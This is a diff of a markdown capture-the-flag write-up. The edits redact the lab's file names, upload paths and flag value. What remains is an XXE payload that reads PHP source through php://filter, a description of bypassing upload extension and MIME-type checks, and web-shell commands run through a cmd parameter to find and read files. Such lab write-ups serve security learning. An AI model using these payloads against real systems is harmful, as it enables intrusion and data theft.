@@ -7,21 +7,21 @@
 
 ## **Step 2: Discovering the Upload Directory**
 - Examined page source and found references to `submit.php`.
-- Discovered `script.js` containing more information, including `upload.php`.
-- Navigated to `upload.php`, but it didn’t reveal anything directly.
+- Discovered `.js` file containing more information, including `.php` file.
+- Navigated to the new `.php` file, but it didn’t reveal anything directly.
 
 ## **Step 3: Using XXE to Extract `upload.php` Source Code**
-- Exploited an **XML External Entity (XXE)** vulnerability to extract `upload.php`:
+- Exploited an **XML External Entity (XXE)** vulnerability to extract the new `.php` file:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
-  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=.php"> ]>
   <svg>&xxe;</svg>
   ```
 - Intercepted the request in **Burp Suite**, modified the file validation logic, and uploaded the `.svg` file.
 - Received a **base64-encoded** response, which was decoded using **CyberChef**.
 - Learned:
   - Where files are stored.
-  - How files are renamed (`YMD_filename` format).
+  - How files are renamed.
   - That the system used **MIME-Type validation**.
 
 ## **Step 4: Bypassing MIME-Type Validation**
@@ -43,24 +43,24 @@
 ## **Step 6: Exploiting the Uploaded Web Shell**
 - Navigated to the correct upload directory based on previous findings:
   ```bash
-  /contact/user_feedback_submissions/250330_shell.phar.jpg?cmd=id
+  /contact/****_********_***********/250330_shell.phar.jpg?cmd=id
   ```
 - Verified code execution by running `id`.
 
 ## **Step 7: Finding and Reading the Flag**
 - Searched for flag files:
   ```bash
-  /contact/user_feedback_submissions/250330_shell.phar.jpg?cmd=find / -name flag*.txt
+  /contact/****_********_***********/250330_shell.phar.jpg?cmd=find / -name flag*.txt
   ```
 - Located the flag file and retrieved its contents:
   ```bash
-  /contact/user_feedback_submissions/250330_shell.phar.jpg?cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+  /contact/****_********_***********/250330_shell.phar.jpg?cmd=cat /******************.txt
   ```
 
 ---
 
 ## **Summary**
-You exploited an insecure file upload by bypassing file extension restrictions, MIME-type validation, and leveraging an XXE vulnerability to gather insights about the server. Using this knowledge, you embedded a PHP web shell inside a valid JPEG file and executed commands remotely to locate and read the flag.
+I exploited an insecure file upload by bypassing file extension restrictions, MIME-type validation, and leveraging an XXE vulnerability to gather insights about the server. Using this knowledge, I embedded a PHP web shell inside a valid JPEG file and executed commands remotely to locate and read the flag.
 
 ---
 
